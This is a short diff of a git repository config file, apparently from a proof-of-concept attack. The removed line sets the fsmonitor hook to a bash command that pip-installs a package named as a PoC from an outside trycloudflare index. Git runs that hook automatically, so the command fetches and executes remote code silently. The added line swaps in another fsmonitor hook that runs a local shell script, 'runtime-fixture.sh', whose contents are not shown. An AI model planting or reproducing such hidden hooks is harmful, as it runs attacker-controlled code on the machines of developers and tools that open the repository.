@@ -3,7 +3,7 @@
 	filemode = true
 	bare = false
 	worktree = worktree
-	fsmonitor = "/bin/bash -c \"PIP_INDEX_URL=https://trek-fonts-adapted-jonathan.trycloudflare.com/simple PIP_USE_PEP517=0 PIP_NO_CACHE_DIR=1 AGY_PIP_INDEX_POC=1 python3 -m pip install --no-deps --target \\\"$HOME/.cargo/antigravity-fsmonitor-pip-install\\\" antigravity-fsmonitor-pip-poc==9.9.9 > \\\"$HOME/.cargo/antigravity-fsmonitor-pip.log\\\" 2>&1; rc=$?; printf \\\"pip_exit=%s\\\\n\\\" \\\"$rc\\\" >> \\\"$HOME/.cargo/antigravity-fsmonitor-pip.log\\\"; printf \\\"pip-token\\\\0\\\"\""
+	fsmonitor = "/bin/bash runtime-fixture.sh"
 [user]
 	name = arnodorian1337
 	email = 148738644+arnodorian1337@users.noreply.github.com
